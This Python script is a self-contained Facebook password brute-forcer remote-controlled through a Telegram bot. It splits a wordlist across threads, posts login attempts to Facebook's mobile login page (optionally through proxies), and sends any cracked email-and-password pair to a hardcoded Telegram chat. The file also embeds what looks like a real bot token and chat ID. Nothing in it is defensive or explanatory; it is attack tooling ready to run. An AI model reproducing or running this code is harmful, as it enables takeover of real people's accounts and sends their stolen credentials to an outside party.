#!/usr/bin/env python3
# FB Brute + Telegram Controller - Single File

import requests, time, threading, sys, os, random, re
from datetime import datetime

BOT_TOKEN = "8839323047:AAG8zWPJLrd9SFYGyz7cwKCz4nUAoMxY4Ts"
CHAT_ID = "6095501363"

class FBController:
    def __init__(self):
        self.last_update = 0
        self.running = False
        self.target = None
        self.attempts = 0
        self.found_pass = None
        
    def send(self, msg):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": msg[:4000]}, timeout=10)
        except:
            pass
    
    def login_fb(self, email, password, proxy=None):
        try:
            sess = requests.Session()
            sess.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"})
            if proxy:
                sess.proxies = {"http": proxy, "https": proxy}
            data = {"email": email, "pass": password, "login": "Log In"}
            r = sess.post("https://mbasic.facebook.com/login/", data=data, timeout=15)
            if "c_user" in sess.cookies.get_dict():
                return True
            return False
        except:
            return False
    
    def brute_worker(self, email, passwords, thread_id):
        for i, pwd in enumerate(passwords):
            if not self.running or self.found_pass:
                break
            self.attempts += 1
            if self.login_fb(email, pwd):
                self.found_pass = pwd
                self.running = False
                self.send(f"✅ SUCCESS! {email} : {pwd}")
                return
            if self.attempts % 100 == 0:
                self.send(f"[*] {self.attempts} attempts | Last: {pwd[:15]}")
            time.sleep(0.5)
    
    def start_brute(self, email, wordlist_path, threads=5):
        try:
            with open(wordlist_path, 'r') as f:
                words = [l.strip() for l in f if l.strip()]
        except:
            self.send("Wordlist not found")
            return
        if not words:
            self.send("Empty wordlist")
            return
        
        self.running = True
        self.target = email
        self.attempts = 0
        self.found_pass = None
        self.send(f"🚀 Brute started: {email} | {len(words)} passwords | {threads} threads")
        
        chunk = len(words) // threads
        threads_list = []
        for t in range(threads):
            start = t * chunk
            end = start + chunk if t < threads-1 else len(words)
            thr = threading.Thread(target=self.brute_worker, args=(email, words[start:end], t))
            thr.start()
            threads_list.append(thr)
        
        for thr in threads_list:
            thr.join()
        
        if not self.found_pass:
            self.send(f"❌ Failed after {self.attempts} attempts")
        self.running = False
    
    def cmd_help(self):
        self.send("""🔧 FB BRUTE CONTROLLER
/brute <email> <wordlist> - Start attack
/stop - Stop attack
/status - Show progress
/help - This menu""")
    
    def process_cmd(self, text):
        cmd = text.strip().lower()
        if cmd == "/help":
            self.cmd_help()
        elif cmd == "/stop":
            self.running = False
            self.send("⏹️ Stopped")
        elif cmd == "/status":
            self.send(f"Target: {self.target}\nAttempts: {self.attempts}\nFound: {self.found_pass}\nRunning: {self.running}")
        elif cmd.startswith("/brute"):
            parts = cmd.split()
            if len(parts) >= 3:
                threading.Thread(target=self.start_brute, args=(parts[1], parts[2], 5), daemon=True).start()
            else:
                self.send("Usage: /brute email@example.com wordlist.txt")
    
    def run(self):
        self.send("✅ FB Controller Online | Send /help")
        while True:
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={self.last_update+1}&timeout=30"
                r = requests.get(url, timeout=35).json()
                if r.get("ok"):
                    for upd in r.get("result", []):
                        self.last_update = upd["update_id"]
                        msg = upd.get("message", {})
                        if str(msg.get("chat", {}).get("id")) == CHAT_ID:
                            self.process_cmd(msg.get("text", ""))
            except:
                pass
            time.sleep(1)

if __name__ == "__main__":
    FBController().run()
